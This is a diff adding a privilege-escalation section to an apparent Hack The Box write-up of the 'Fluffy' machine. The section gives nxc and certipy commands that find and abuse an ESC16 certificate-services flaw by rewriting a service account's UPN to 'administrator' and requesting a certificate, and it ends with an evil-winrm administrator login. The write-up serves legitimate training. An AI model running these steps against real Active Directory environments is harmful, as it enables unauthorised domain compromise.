@@ -219,3 +219,68 @@ Now that we have the NT hash for both the accounts lets try and use the winrm_sv
 
 The user flag can be found on in the winrm_svc/Desktop directory!
 
+<h2>Privilege Escalation</h2>
+
+The presence of the `ca_svc` account indicates that the target is running an Active Directory Certificate Services or ADCS, we can quickly confirm this using `nxc`.
+
+<h3>nxc</h3>
+
+For the command we will need to specify that we are targeting the `ldap` service, using the credentials for `winrm_svc` and using the `adcs` module:
+
+```
+nxc ldap 10.129.232.88 -u 'winrm_svc' -H ************** -M adcs
+```
+The results confim the prese4nce of an ADCS:
+
+![ADCS](image-16.png)
+
+<h3>Certipy</h3>
+
+Now that we have confirmed that the ADCS `fluffy-DC01-CA` is running on the domain controller `DC01.fluffy.htb`. We can use the `certipy-ad` tool to find the vulnerable template in the CA using the `ca_svc` credentials:
+
+```
+...
+
+[!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+[*] Remarks
+    ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+
+...
+```
+
+The steps as listen in the [certipy documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) date that the first step in exploiting this `ESC16` vulnerability is to "Update the victim account's UPN to the target administrator's sAMAccountName"
+
+To do this we need to run the following command:
+
+```
+certipy-ad account update -username "p.agila@10.129.232.88" -p "*********" -user
+ca_svc -upn 'administrator'
+```
+![UPN](image-17.png)
+
+Then we need to "Request a certificate as the "victim" user from any suitable client authentication template" using the command:
+
+```
+certipy-ad req -u 'ca_svc' -hashes **************** -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+```
+
+![administrator.pfx](image-18.png)
+
+The administrator certificate is now saved in the `administrator.pkx` file. In order to make use of it we first need to change the `UPN` of the `ca_svc` user:
+
+![Update UPN](image-19.png)
+
+We are now ready to obtain the administrators hash:
+
+![Obtain Administrator Hash](image-20.png)
+
+<h3>Evil-Winrm</h3>
+
+Using the administrators hash we can login to the target machine using `evil-winrm`:
+
+![Administrator Evil-winrm](image-21.png)
+
+We can find the root.txt flag in the Administrators Desktop directory thus solving the challenge!
+
+![Flag Solved](image-22.png)
